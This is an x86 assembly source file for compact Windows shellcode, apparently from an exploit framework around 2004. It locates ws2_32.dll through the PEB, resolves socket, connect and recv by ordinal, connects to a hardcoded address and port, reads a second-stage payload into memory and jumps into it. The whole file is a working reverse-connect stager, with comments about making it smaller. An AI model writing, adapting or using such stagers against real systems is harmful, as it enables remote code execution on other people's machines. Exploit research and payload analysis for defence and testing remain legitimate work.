BITS 32

; Implementation of Oded Horovitz's static ordinal concept originally presented
; at CanSecWest 2004.
;
; skape vs spoonm vs vlad902 tagteam, bringing x86 back to the streets
; October 2004, Happy Halloween, don't forget reflective tape!
;
; walks the PEB loaded module list in initialized order looking for ws2_32.dll
; and then uses the function ordinals to resolve the absolute function address
;
; reverse connect + recv and jmp
;
; 96 bytes yo, now let's get it under 90 :)


find_module_list:
  cld                       ; clear direction flag for string instructions
  xor ebx, ebx              ; clear ebx
  mov eax, [fs:ebx + 0x30]  ; PEB ptr in eax
  mov eax, [eax + 0xc]      ; LoaderData ptr to LDR_DATA
  mov edx, [eax + 0x1c]     ; flink initialization ptr to LDR_MODULE

module_loop:
  mov edx, [edx]            ; move to the next LDR_MODULE
  mov esi, [edx + 0x20]     ; ptr to unicode BaseDllName

                            ; patented skape kungfu follows
                            ; ninja comparison tekneek, all rights reserved
  lodsd                     ; skip ws
  lodsd                     ; load \x32\x00\x5f\x00 (32)
  dec esi                   ; offset back one for a better add "hash" (spoon)
  add eax, [esi]            ; Add 0x32003300 to 0x005f0032 -> 0x325f3322
  cmp eax, 0x325f3332       ; Is it true, is it actually you? ws2_32?
  jnz module_loop           ; it isn't, keep trying
  mov ebp, [edx + 0x8]      ; it is you! dll base address into ebp

  ; dll base is in ebp
resolve_functions:
  mov eax, [ebp + 0x3c]       ; PE offset into eax
  mov ecx, [ebp + eax + 0x78] ; Export Table offset into ecx
  mov ecx, [ebp + ecx + 0x1c] ; Address Table offset into ecx
  add ecx, ebp                ; absolute Address Table address into ecx

  mov eax, [ecx + 0x58]       ; ordinal 23 (socket)
  add eax, ebp                ; make absolute

  mov esi, [ecx + 0x3c]       ; ordinal 16 (recv)
  add esi, ebp                ; make absolute

  add ebp, [ecx + 0xc]        ; ordinal 4 (connect)
;  add ebp, edi                ; make absolute


call_socket:                ; socket(AF_INET, SOCK_STREAM, 0)
  push ebx                  ; push 0 (protocol)
  push BYTE 0x01            ; push 1 (SOCK_STREAM)
  push BYTE 0x02            ; push 2 (AF_INET)
  call eax                  ; call socket()
  xchg eax, edi             ; socket handle into edi

call_connect:               ; connect(socket, sockaddr, addrlen)
  ; sock_addr data
  push 0x0100007f           ; push IP (127.0.0.1)
  push 0x11220002           ; push port (8721) + flags
  mov ecx, esp              ; save address

  ; recv frame
  push ebx                  ; flags
  mov bh, 0x0c              ; len
  push ebx                  ; len 3072 (just enough for libinject)
  push ecx                  ; buffer
  push edi                  ; socket
  push ecx                  ; return into buffer

  ; connect frame
  push BYTE 0x10            ; addrlen (16)
                            ; ninja possible optimization by skape:
                            ; as long as the port and flags are greater than
                            ; 16 and still positive sign, you can double the
                            ; port+flags as the addrlen!
  push ecx                  ; push sockaddr
  push edi                  ; push socket handle
  push esi                  ; return into recv
  jmp ebp                   ; call connect(), ret into recv, ret into buffer
                            ; rocking it russian style
